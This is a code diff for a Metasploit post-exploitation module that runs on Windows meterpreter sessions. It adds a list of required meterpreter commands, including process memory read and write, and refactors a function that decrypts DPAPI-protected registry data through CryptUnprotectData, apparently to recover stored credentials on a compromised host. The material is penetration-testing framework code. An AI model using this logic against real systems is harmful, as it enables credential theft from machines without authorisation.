@@ -35,7 +35,22 @@ class MetasploitModule < Msf::Post
         ],
         'Platform' => ['win'],
         'SessionTypes' => ['meterpreter'],
-        'Author' => ['Quentin Kaiser <kaiserquentin[at]gmail.com>']
+        'Author' => ['Quentin Kaiser <kaiserquentin[at]gmail.com>'],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_fs_stat
+              stdapi_railgun_api
+              stdapi_sys_config_getsid
+              stdapi_sys_process_attach
+              stdapi_sys_process_get_processes
+              stdapi_sys_process_getpid
+              stdapi_sys_process_memory_allocate
+              stdapi_sys_process_memory_read
+              stdapi_sys_process_memory_write
+            ]
+          }
+        }
       )
     )
   end
@@ -50,7 +65,6 @@ class MetasploitModule < Msf::Post
   #
   def decrypt_reg(data, entropy)
     begin
-      rg = session.railgun
       pid = session.sys.process.getpid
       process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
 
@@ -71,7 +85,7 @@ class MetasploitModule < Msf::Post
         eaddr = [emem].pack('V')
         elen = [entropy.length].pack('V')
 
-        ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 8)
+        ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 8)
         len, addr = ret['pDataOut'].unpack('V2')
       else
         # Convert using rex, basically doing: [mem & 0xffffffff, mem >> 32].pack("VV")
@@ -81,7 +95,7 @@ class MetasploitModule < Msf::Post
         eaddr = Rex::Text.pack_int64le(emem)
         elen = Rex::Text.pack_int64le(entropy.length)
 
-        ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 16)
+        ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 16)
         p_data = ret['pDataOut'].unpack('VVVV')
         len = p_data[0] + (p_data[1] << 32)
         addr = p_data[2] + (p_data[3] << 32)
